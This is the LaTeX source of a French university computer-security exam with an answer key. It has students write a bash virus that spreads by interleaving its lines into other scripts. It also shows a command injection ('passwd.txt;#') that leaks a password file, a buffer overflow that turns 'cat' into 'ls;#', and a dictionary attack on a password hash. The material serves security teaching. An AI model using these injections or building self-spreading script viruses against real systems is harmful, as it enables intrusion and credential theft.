\documentclass[a4paper,9pt]{article}

\usepackage{fullpage}
\usepackage[utf8]{inputenc}
\usepackage{amsmath,amsthm}
\usepackage{amsfonts}
%\usepackage{algorithm}
\usepackage{graphicx}
%\usepackage[compatible,noend]{algpseudocode}
\usepackage{latexsym}
\usepackage{float,color}
\usepackage{xcolor}
\usepackage{framed}
\usepackage{listings}
\usepackage{comment}

\definecolor{shadecolor}{RGB}{190,190,190}


\newenvironment{terminal}{\color{black}\begin{snugshade*}}
{\end{snugshade*}\color{black}}


%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%
\newcommand{\Fd}{\mathbb{F}}
\newcommand{\Znat}{\mathbb{Z}}
\newcommand{\Nnat}{\mathbb{N}}
\newcommand{\pgcd}{\mbox{pgcd}}

%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%
\theoremstyle{plain}
\newtheorem{lemme}{Lemme}
\newtheorem{algorithme}{ Algorithme }
\newtheorem{corolaire}{Corollaire}
\newtheorem{propriete}{Propri\'et\'e}
\newtheorem{proposition}{Proposition}
\newtheorem{theoreme} {Th\'eor\`eme}
\newtheorem{definition}{D\'efinition}

\theoremstyle{definition}
\newtheorem{exercice}{Exercice}
%\theoremstyle{remark}
\newtheorem{remarque}{Remarque}
\newtheorem{exemple}{Exemple}
%\newtheorem*{correction}{Correction}
\excludecomment{correction}

%%%%%%%%%%%%%%%%%

\definecolor{mGreen}{rgb}{0,0.6,0}
\definecolor{mGray}{rgb}{0.5,0.5,0.5}
\definecolor{mPurple}{rgb}{0.58,0,0.82}
\definecolor{backgroundColour}{rgb}{0.85,0.85,0.85}


\lstdefinestyle{CStyle}{
    backgroundcolor=\color{backgroundColour},   
    commentstyle=\color{mGreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{mGray},
    stringstyle=\color{mPurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2,
    language=C
}





%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%


\begin{document}


\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
\noindent \textbf{Université de Perpignan} \hfill  Année \the\year \\
Licence 3 Informatique \hfill C. Legrand \\

\begin{center}
  {  {\scshape \large Contrôle Continu  } \\
    \vrule depth 0pt height 0.5pt width 1cm
    \medskip
    
{\scshape    S\'ecurit\'e Informatique}  \\
}
\end{center}
\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}

\bigskip

\bigskip


\noindent\textit{Recommandations :}
\begin{itemize}
\item Durée: 3h.
\item Seulement les documents fournis sont autorisés.
  \item Vous rendrez des fichiers pour l'exercice 1 et la question 3 de l'exercice 2. Pour les question 1 et 2 de l'exercice 2 vous pouvez le faire sur une copie papier ou numérique. 
  \end{itemize}
\noindent\textit{Commandes bash utiles :} \verb|head|, \verb|tail| et \verb|cut|. Pour \verb|cut| on peut récupérer les caractères \verb|i| à \verb|j|. Vous avez une exemple pour \verb|i=1| et \verb|j=4| ci-dessous.
\begin{small}
\begin{terminal}
\begin{verbatim}
clegrand@mon-pc:~$  cat fichier.txt 
nom prenom age
Durand Michel 19
Esposito Anna 35
Dufour Elsa 47
clegrand@mon-pc:~$ cat fichier.txt | cut -c 2-4
om 
ura
spo
ufo
\end{verbatim}
\end{terminal}
\end{small}
%\begin{itemize}
%\item Tout document (papier ou électronique (pdf, doc, txt) ) est  autorisé.
%\item Vous devrez rendre une copie \'electronique (en format .txt) de l'examen.
%\item Vous l'enverrez en pi\`ece jointe à l'adresse email suivante
%\begin{center}
%\texttt{cedric.legrand@univ-perp.fr}
%\end{center}
%ou me la transmettrez sur une clef usb.
%\end{itemize}

\begin{exercice}
  L'objectif de l'exercice est d'implanter un virus en script bash par entrelacement. Il insère une à une les lignes de la partie virale du virus chacune  suivi de  1 à 3 lignes de codes (nombre choisi aléatoirement à chaque fois). A la finde chaque ligne viral est ajouté le chiffre $\in \{1,2,3\}$ donnant le nombre de lignes de code hote qui suivent.
  \begin{center}
\includegraphics[width=10cm]{entrelacement.pdf}
    \end{center}
  \begin{enumerate}
  \item Donnez la commande qui permet d'afficher la $n$-ième ligne d'un fichier.  
  \item Faire un script \verb|entrelace.sh| qui prend deux fichiers \verb|fic1.sh| et \verb|fic2.sh| en argument. Il s'assure d'abord que \verb|fic2.sh| a un nombre de ligne au moins 3 fois supérieur à \verb|fic1.sh|. Ensuite pour chaque ligne \verb|fic1.sh|, il choisit $r \in \{1,2,3\}$ aléatoirement, écrit la ligne dans un fichier \verb|result.sh| auquel il ajoute en fin de la ligne la valeur de $r$ et ensuite il écrit $r$ lignes de \verb|fic2.sh| dans le  fichier \verb|result.sh|. Pour la dernière ligne de \verb|fic1.sh| il prend $r=0$ et ajoute ensuite toutes lignes restantes de \verb|fic2.sh|.  Vous avez ci-dessous un exemple de ce que doit faire ce script \verb|bash|. 
    \begin{terminal}      
\begin{verbatim}
clegrand@mon-pc:~$ cat fic1.sh 
#!/bin/bash
echo "coucou0"
var0=0
echo "coucou1"
var1=1
clegrand@mon-pc:~$ cat fic2.sh 
#!/bin/bash
#ligne 0
#ligne 1
#ligne 2
#ligne 3
#ligne 4
#ligne 5
#ligne 6
#ligne 7
#ligne 8
#ligne 9
#ligne 10
#ligne 11
#ligne 12
#ligne 13
#ligne 14
#ligne 15
#ligne 16
#ligne 17
#ligne 18
clegrand@mon-pc:~$ ./entrelacement2.sh fic1.sh fic2.sh
clegrand@mon-pc:~$ cat result.sh 
#!/bin/bash1
#!/bin/bash
echo "coucou0"3
#ligne 0
#ligne 1
#ligne 2
var0=03
#ligne 3
#ligne 4
#ligne 5
echo "coucou1"3
#ligne 6
#ligne 7
#ligne 8
var1=10
#ligne 9
#ligne 10
#ligne 11
#ligne 12
#ligne 13
#ligne 14
#ligne 15
#ligne 16
#ligne 17
#ligne 18
\end{verbatim}
    \end{terminal}
    
  \item Donnez le code bash  qui permet de découper une ligne en deux : le dernier caractère dans la variable \verb|last| et tous les autres dans la variable \verb|ligne_tronquee| et affiche ces deux variables.
  \item Donnez un code \verb|restaure.sh| qui prend le fichier \verb|result.sh| obtenu avec le script \verb|entrelace.sh| de la question 2)  et fabrique les deux fichiers \verb|fic1.sh| et \verb|fic2.sh|.
    \item Combinez les scripts \verb|entrelace.sh| et \verb|restaure.sh| pour obtenir le virus par entrelacement: le virus cherche dans le répertoire courant les fichier .sh suffisament grand et les infecte par entrelacement aléatoire. 
   \end{enumerate}
\end{exercice}





\begin{exercice}
  Dans l'archive \verb|exo2.zip| vous trouverez les fichiers utiles à cet exercice. On considère le programme \verb|affiche-transaction| qui sert à visualiser des fichiers de transactions financières. Le code de ce programme est donné ci-dessous (compilé par \verb|gcc affiche-transaction.c -lcrypt -o affiche-transation|):
  \begin{small}
    \lstinputlisting[firstline=1,lastline=100,style=CStyle]{affiche-transaction.c}
    \end{small}
%\lstinputlisting{affiche-transaction.c} 
%\lstinputlisting{affiche-transaction.c} 
%\usepackage{listings}
%$$ inclure le fichier $$
%\lstinputlisting[lastline=4]{listings.sty}
%\begin{lstlisting}
% \input{affiche-transaction.c}
%\end{lstlisting}

Voici brièvement ce que fait ce code:
\begin{itemize}
\item La fonction \verb|auth|: les  droits d'accès de l'utilisateur sont vérifié via leur mot de passe, et en comparant son haché avec celui stocké dans le fichier \verb|passwd.txt|.
\item La fonction \verb|main|, après la vérification faite avec \verb|auth|, le programme demande l'année $YYYY$ des transactions et affiche le fichier correspondant par la commande:
\begin{verbatim}
user@pc:~$ cat   YYYY-transactions.txt
\end{verbatim}
\end{itemize}

Répondre aux questions suivantes (elles sont indépendantes):
\begin{enumerate}
\item On considère l'utilisateur \verb|marc| de mot de passe \verb|aaaa|. Proposez une solution (qui n'implique pas de débordement de tampon) pour que l'utilisateur puisse visualiser le contenu du fichier \verb|passwd.txt|.
  \item Avec un débordement de tampon, faites en sorte de ne pas faire de  \verb|cat| mais de lister le contenu du répertoire. 
\item On connait le haché du mot de passe de \verb|admin| utilisateurs (qui se trouve dans  \verb|passwd.txt|) et on suspecte que le mot de passe est formé de deux mots concaténés du fichier \verb|dictionnary-french-passwords.txt|. Faire un programme C qui hache les mots de passe possiblent afin de retrouver celui de l'utilisateur \verb|admin|. Vous pouvez réutiliser la fonction \verb|hachage| du programme \verb|affiche-transaction.c| pour caculer un haché..
  \end{enumerate}


\end{exercice}


\begin{correction}
\begin{enumerate}
\item Il faut modifier  la commande \verb|bash| exécutée par \verb|system| comme suit:
  \begin{itemize}
  \item l'entrée \verb|YYYY| est utilisée pour mettre le fichier \verb|passwd.txt| en argument du \verb|cat|.
  \item  On met ensuite un \verb|;| pour terminer la commande et un \verb|#| pour commenter ce qui suit (le \verb|-tansactions.txt| qui est concaténé).
  \end{itemize}
  Voici une trace d'exécution
\begin{terminal}
\begin{verbatim}
user@pc:~$ ./affiche-transaction julien aaaa
pw_hash=ScMbjFG7X0lduHhErJ8sb.
Entrez l'année des transactions:passwd.txt;#
command=cat passwd.txt;#-transactions.txt
marc   ScMbjFG7X0lduHhErJ8sb.
julien  ZJzeyzrAsFeetibF7X6Ow.
\end{verbatim}
\end{terminal}
\item Ici il faut faire un débordement de tampon afin de modifier \verb|cat| en \verb|ls;#|. Les tableaux de caractères  \verb|nom|,\verb|passwd|,\verb|annee| et \verb|command| sont contigus en mémoire. Donc en faisant déborder le tableau \verb|annee| on peut modifier le début de la chaine de caractères \verb|command|. Essayons en ajoutant des commentaires \#....\# avant \verb|ls;#| jusqu'à le faire apparaitre au début de command:
\begin{terminal}
\begin{verbatim}
user@pc:~$ ./affiche-transaction marc aaaa
pw_hash=ZJzeyzrAsFeetibF7X6Ow.
Entrez l'année des transactions:###############ls;#
command=cat ###############ls;#-transactions.txt
user@pc:~$ ./affiche-transaction julien aaaa
pw_hash=ZJzeyzrAsFeetibF7X6Ow.
Entrez l'année des transactions:###################ls;#
command=;####################ls;####################ls;-transactions.txt
sh: 1: Syntax error: ";" unexpected
*** stack smashing detected ***: terminated
Aborted (core dumped)
user@pc:~$ ./affiche-transaction julien aaaa
pw_hash=ZJzeyzrAsFeetibF7X6Ow.
Entrez l'année des transactions:#####################ls;#
command=ls;######################ls;##-transactions.txt
2000-transactions.txt  affiche-transaction.c   attaque-dictionnaire.c~		 overflow-nom-fichier.c~  remplir-tab.c
affiche-tab.c	       affiche-transaction.c~  calc.c				 passwd.txt		  remplir-tab.c~
affiche-tab.c~	       a.out		       calc.c~				 passwd.txt~		  transaction-2000.txt~
affiche-transaction    attaque-dictionnaire.c  dictionnary-french-passwords.txt  remplir-tab
\end{verbatim}
\item Le corrigé  est donné dans le fichier \verb|attaque-dictionnaire.c|.
\end{terminal}
\end{enumerate}

\end{correction}


\end{document}
